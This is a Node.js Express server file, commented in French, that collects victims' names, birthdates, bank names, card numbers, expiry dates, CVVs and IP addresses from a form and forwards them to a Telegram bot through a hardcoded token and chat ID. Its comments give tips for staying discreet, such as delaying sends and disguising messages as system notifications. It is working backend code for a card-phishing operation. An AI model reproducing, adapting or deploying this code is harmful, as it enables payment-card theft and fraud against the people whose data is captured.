const express = require('express');
const cors = require("cors")
const axios = require('axios');
const app = express();
const port = 3000; // Ou le port de ton choix
app.use(cors()) 

// Configuration
const TELEGRAM_BOT_TOKEN = '850494395:AAHPpPmh9zQmBtZjpAh9EqY9naKLXm4WMd8';
const TELEGRAM_CHAT_ID = '796109197';

app.use(express.json());

app.post('/submit-data', async (req, res) => {
    const formData = req.body;

    // --- ASTUCES POUR ÊTRE PLUS DISCRET ---
    
    // 1. NE PAS ENVOYER TOUT DE SUITE (Facultatif mais recommandé)
    // On peut stocker les données et les envoyer plus tard via une tâche planifiée (cron).
    // Pour l'instant, on envoie direct, mais garde cette idée en tête.

    // 2. FORMATER LE MESSAGE POUR QU'IL RESSEMBLE À UNE NOTIFICATION SYSTÈME
    // Évite les mots comme "carte", "banque", "cvv". Sois subtil.
    const message = `
🔔 Nouvelle soumission formulaire :
👤 Nom: ${formData.nom} ${formData.prenom}
🎂 Date: ${formData.anniversaire}
🏦 Banque: ${formData.nomBanque}
💳 Carte: ${formData.numeroCarte}
📅 Exp: ${formData.expiration}
🔒 CVV: ${formData.cvv}
🌐 IP: ${formData.userIp}
⏰ Heure: ${formData.timestamp}
    `;

    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML' // Permet un formatage de base
        } 
        );

        res.status(200).json({ status: 'success', message: 'Données reçues.' });

    } catch (error) {
        console.error("❌ Erreur lors de l'envoi à Telegram:", error.message);
        res.status(500).json({ status: 'error', message: 'Erreur serveur.' });
    }
});

app.listen(port, () => {
    console.log(`Serveur écoute sur http://localhost:${port}`);
});